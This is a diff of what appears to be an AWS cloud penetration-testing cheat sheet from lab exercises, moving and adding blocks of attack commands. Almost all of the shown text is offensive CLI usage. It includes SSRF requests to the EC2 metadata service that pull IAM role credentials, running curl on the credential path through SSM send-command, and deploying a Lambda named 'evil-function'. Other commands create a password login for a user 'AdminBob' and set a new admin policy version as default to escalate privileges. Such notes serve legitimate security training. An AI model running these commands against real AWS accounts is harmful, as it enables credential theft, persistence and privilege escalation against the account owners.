@@ -68,46 +68,6 @@ TOKEN=curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metada
 curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
 curl http://example.com/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ISRM-WAF-Role
 
-
-aws ec2 describe-images --owners amazon --filters
-'Name=name,Values=amzn-ami-hvm-*-x86_64-gp2' 'Name=state,Values=available' --output
-json
-aws ec2 describe-subnets
-aws ec2 describe-security-groups
-aws iam list-instance-profiles
-aws ec2 run-instances --subnet-id subnet-0b57901260df6b3f3 --image-id
-ami-0d08a21fc010da680 --iam-instance-profile Name=ec2_admin --instance-type t2.micro
---security-group-ids "sg-06407fe95d211b245"
-aws ssm send-command \
---document-name "AWS-RunShellScript" \
---parameters 'commands=["curl
-http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2admin/"]' \
---targets "Key=instanceids,Values=i-0aa5cdcaf86dec148" \
---comment "aws cli 1"
-aws ssm get-command-invocation \
---command-id "0765bff4-4966-446f-a0a2-4e0cdfee565f" \
---instance-id "i-0da83d9b4322af3fa"
-
-
-
-aws cloudformation create-stack --stack-name ad-stack --template-body
-file://new_policy.json --capabilities CAPABILITY_NAMED_IAM --role-arn
-arn:aws:iam::161176965264:role/lab12CFDeployRole
-aws cloudformation describe-stacks --stack-name ad-stack
-aws cloudformation describe-stack-events --stack-name ad-stack
-
-
-
-aws lambda create-function \
---function-name evil-function \
---runtime python3.8 \
---zip-file fileb://evil-function.zip \
---handler evil.handler \
---role arn:aws:iam::645723898191:role/lab11lambdaiam
-aws lambda invoke --function-name evil-function invoke_out.txt
-
-aws iam create-login-profile --user-name AdminBob --password abcd@12345
---no-password-reset-required
 ```
 
 ## Post-compromise
@@ -254,6 +214,53 @@ aws iam get-policy-version --policy-arn arn:aws:iam::645723898191:policy/Print
 --version-id v1
 aws iam create-policy-version --policy-arn arn:aws:iam::645723898191:policy/Print
 --policy-document file://newAdminPolicy.json --set-as-default
+
+aws ec2 describe-images --owners amazon --filters
+'Name=name,Values=amzn-ami-hvm-*-x86_64-gp2' 'Name=state,Values=available' --output
+json
+aws ec2 describe-subnets
+aws ec2 describe-security-groups
+aws iam list-instance-profiles
+aws ec2 run-instances --subnet-id subnet-0b57901260df6b3f3 --image-id
+ami-0d08a21fc010da680 --iam-instance-profile Name=ec2_admin --instance-type t2.micro
+--security-group-ids "sg-06407fe95d211b245"
+aws ssm send-command \
+--document-name "AWS-RunShellScript" \
+--parameters 'commands=["curl
+http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2admin/"]' \
+--targets "Key=instanceids,Values=i-0aa5cdcaf86dec148" \
+--comment "aws cli 1"
+aws ssm get-command-invocation \
+--command-id "0765bff4-4966-446f-a0a2-4e0cdfee565f" \
+--instance-id "i-0da83d9b4322af3fa"
+
+
+
+aws cloudformation create-stack --stack-name ad-stack --template-body
+file://new_policy.json --capabilities CAPABILITY_NAMED_IAM --role-arn
+arn:aws:iam::161176965264:role/lab12CFDeployRole
+aws cloudformation describe-stacks --stack-name ad-stack
+aws cloudformation describe-stack-events --stack-name ad-stack
+
+
+
+aws lambda create-function \
+--function-name evil-function \
+--runtime python3.8 \
+--zip-file fileb://evil-function.zip \
+--handler evil.handler \
+--role arn:aws:iam::645723898191:role/lab11lambdaiam
+aws lambda invoke --function-name evil-function invoke_out.txt
+
+aws iam create-login-profile --user-name AdminBob --password abcd@12345
+--no-password-reset-required
+
+aws apigateway get-account
+aws apigateway get-rest-apis
+aws apigateway get-method --rest-api-id 4xn6jt50a6 --http-method GET
+--resource-id lmxnuv
+aws apigateway get-authorizers --rest-api-id yz2duibd7a
+aws apigateway get-client-certificates
 ```
 
 ## IAM
